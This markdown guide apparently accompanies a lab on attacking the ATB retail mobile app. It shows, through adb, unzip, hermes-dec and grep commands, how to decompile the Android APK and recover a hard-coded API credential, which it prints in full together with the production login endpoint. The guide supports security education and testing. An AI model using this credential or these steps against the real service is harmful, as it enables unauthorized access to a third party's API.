# Step 1 in the real world — pulling the API credential from the ATB APK

In the lab the `mobapp` service just *accepts* `reg_user:basic*88password!prod99`.
In reality that credential is **hard-coded in the mobile app** and you recover it
by decompiling the APK. The ATB app is React Native, so the logic lives as Hermes
bytecode inside `assets/index.android.bundle`. Tool:
[hermes-dec](https://github.com/P1sec/hermes-dec) (P1sec).

> For authorized testing / education only. Only analyze an app you are allowed to.

## 1. Pull base.apk from the device
```bash
adb devices                                   # device connected, USB debugging on
adb shell pm list packages | grep -i atb      # find the package (e.g. ua.com.atbmarket / com.atb...)
PKG=ua.com.atbmarket                           # substitute the real one from above
adb shell pm path "$PKG"                       # APK path(s) — there may be splits
mkdir -p ~/atb_apk && cd ~/atb_apk
adb shell pm path "$PKG" | sed 's/package://' | while read p; do adb pull "$p" .; done
ls -la                                         # base.apk (+ possible split_config.*.apk)
```

## 2. Unzip the APK and locate the bundle
```bash
cd ~/atb_apk
mkdir base && unzip -o base.apk -d base
ls -la base/assets/index.android.bundle        # here it is
xxd base/assets/index.android.bundle | head -1 # Hermes magic = c6 1f bc 03
file base/assets/index.android.bundle
```
If it is **plain JS** (not Hermes) you don't need hermes-dec — just beautify and grep:
```bash
npx prettier base/assets/index.android.bundle > bundle.pretty.js
grep -nEi 'register/login|authorization|basic |reg_user|password' bundle.pretty.js
```

## 3. Decompile the Hermes bytecode
```bash
python3 -m venv ~/venv-hermes && source ~/venv-hermes/bin/activate
pip install hermes-dec
# from source if no pip package:
#   git clone https://github.com/P1sec/hermes-dec && pip install ./hermes-dec

cd ~/atb_apk
hbc-disassembler base/assets/index.android.bundle index.hasm          # -> bytecode listing
hbc-decompiler  base/assets/index.android.bundle index.decompiled.js  # -> readable pseudo-JS
```

## 4. Grep for the secret
```bash
cd ~/atb_apk
grep -nEi 'register/login|/register|Authorization|Basic |reg_user|basic\*|password|otp|api\.|mobapp\.atbmarket' index.decompiled.js index.hasm
grep -nEi 'atbmarket|basic\*88|prod99|reg_user' index.hasm   # constants often sit in the string table
```
Goal: the `POST /register/login` endpoint and the baked-in
`Authorization: Basic reg_user:basic*88password!prod99` — exactly what the lab's
step 1a expects.

## 5. Diff across versions
The write-up compared **3 APK versions (8.0.16 / 8.0.30 / 8.0.48)** — the password
never changed since release. Pull a few versions (APKMirror / old backups) and diff
their string tables:
```bash
diff <(strings -n6 v8.0.16/assets/index.android.bundle | sort -u) \
     <(strings -n6 v8.0.48/assets/index.android.bundle | sort -u) | grep -i 'basic\|reg_user\|password\|register'
```

## Also useful
- `apktool d base.apk -o base_apktool` — manifest, resources, smali (native side / permissions).
- `jadx-gui base.apk` — the Java/Kotlin side (the report mentioned jadx). RN logic is **not** there (it's in the bundle), but URLs/config sometimes are.
- `strings -n 6 base/assets/index.android.bundle | grep -i atbmarket` — quick & dirty.
